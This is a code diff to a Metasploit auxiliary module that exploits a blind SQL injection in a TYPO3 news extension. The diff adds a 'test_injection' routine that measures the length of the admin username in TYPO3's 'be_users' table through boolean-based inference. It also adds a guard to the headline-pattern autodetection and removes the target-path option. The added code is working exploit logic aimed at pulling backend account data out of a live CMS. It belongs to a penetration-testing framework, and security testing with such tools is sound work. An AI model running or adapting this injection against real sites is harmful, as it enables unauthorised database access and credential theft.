@@ -45,7 +45,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/typo3/']),
         OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
         OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
         OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
@@ -58,6 +57,30 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Vulnerable
     else
       return Exploit::CheckCode::Safe
+    end
+  end
+
+  def test_injection()
+    pattern1, pattern2 = try_autodetect_patterns
+    if pattern1 == '' or pattern2 == ''
+      print_error("Impossible to determine pattern automatically, aborting...")
+      return false
+    else
+      print_status("Testing injection...")
+      offset = 9
+      field = 'username'
+      table = 'be_users'
+      condition = 'uid=1'
+      digit_charset = "0".upto("9").to_a.join('')
+      patterns = {:pattern1 => pattern1, :pattern2 => pattern2}
+      size = blind_size(
+       "length(#{field})+#{offset}",
+       table,
+       condition,
+       2,
+       digit_charset,
+       patterns)
+      return size != ''
     end
   end
 
@@ -149,6 +172,10 @@ class MetasploitModule < Msf::Auxiliary
        }
     })
     news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
+    if news.empty? or news.length < 2
+      print_error("No enough news found on the page with specified id (at least 2 news are necessary)")
+      return '',''
+    end
     pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
     pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
     if pattern1 != '' and pattern2 != ''
